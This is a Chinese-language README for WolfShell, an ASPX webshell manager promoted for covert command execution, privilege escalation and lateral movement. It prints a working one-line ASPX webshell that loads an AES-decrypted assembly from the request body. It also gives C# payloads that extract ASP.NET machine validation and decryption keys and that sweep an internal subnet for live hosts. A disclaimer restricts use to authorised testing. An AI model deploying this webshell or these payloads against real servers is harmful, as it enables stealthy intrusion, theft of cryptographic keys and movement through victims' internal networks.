
# WolfShell：专为ASPX设计的高级WebShell管理工具

WolfShell 是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。

## 🚀 核心优势

*   高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。
*   端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。
*   无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。
*   内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可直接连接并控制处于更深层内网环境中的WebShell节点，实现便捷高效的内网横向穿透。

## 🔥 功能特性

*   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。
*   PowerShell命令执行： 支持执行 PowerShell 脚本和命令。
*   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode。
*   C#代码执行： 支持在运行时动态加载与执行 C# 代码。
*   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
*   Potato提权： 利用系统服务漏洞进行权限提升，支持两种提权模块：
*   efspotato： 利用 EFSPotato 实现权限提升。
*   badpotato： 利用 BadPotato 实现权限提升。
*   内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网webshell执行 CMD 命令进行横向移动。
*   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网webshell执行 PowerShell 命令进行横向移动。


## 安装与使用

1. **下载WolfShell**
   - https://github.com/0x7556/wolfshell/releases

2. **配置环境**
   - 确保目标环境支持ASPX，并已正确配置。

3. **上传WolfShell**
   - 将WolfShell文件上传到目标ASPX服务器。
   
```csharp
<%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(Request.Cookies[0].Value); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
```
4. **访问WebShell**
   - 通过工具客户端连接WebShell，开始使用。

![keep](http://www.18k.icu/img/wolfshell/WolfShell.png)


## 示例

### Cmd命令执行

![CmdShell示例](http://www.18k.icu/img/wolfshell/CmdShell.png)

### PowerShell命令执行

![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)

### C#代码执行

#### 获取 ValidationKey 示例代码

```csharp

using System;
using System.Reflection;
using System.Web.Configuration;
public class Eval
{
public string eval(Object obj)
{
var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
}
}

```

![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode2.png)

#### 扫描C段存活主机 示例代码
```csharp

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
public class Eval
{
public string eval(Object obj)
{
StringBuilder iplist = new StringBuilder();
string baseIP = "192.168.1.";
PingOptions options = new PingOptions();
options.DontFragment = true;
var tasks = new Task[254];
for (int i = 1; i < 255; i++)
{
int ipSuffix = i;
tasks[i - 1] = Task.Run(() =>
{
using (Ping myPing = new Ping())
{
PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
if (reply.Status == IPStatus.Success)
{
lock (iplist)
{
iplist.AppendLine("Alive IP: " + reply.Address.ToString());
}
}
}
});
}
Task.WaitAll(tasks);
return iplist.ToString();
}
}


```


![C#代码示例](http://www.18k.icu/img/wolfshell/SharpCode.png)

### Potato提权示例

#### efspotato

![EfsPotato示例](http://www.18k.icu/img/wolfshell/EfsPotato.png)

#### badpotato


![BadPotato示例](http://www.18k.icu/img/wolfshell/BadPotato.png)

### 内网扫描示例

![NetScan示例](http://www.18k.icu/img/wolfshell/NetScan.png)

### 端口转发示例

![端口转发示例](http://www.18k.icu/img/wolfshell/PortTran.png)


## 免责声明

- 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
- 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。

## 贡献

欢迎任何形式的贡献！请提交问题、建议或拉取请求。

## 许可证

本项目采用MIT许可证，详细信息请参见[LICENSE](LICENSE)文件。

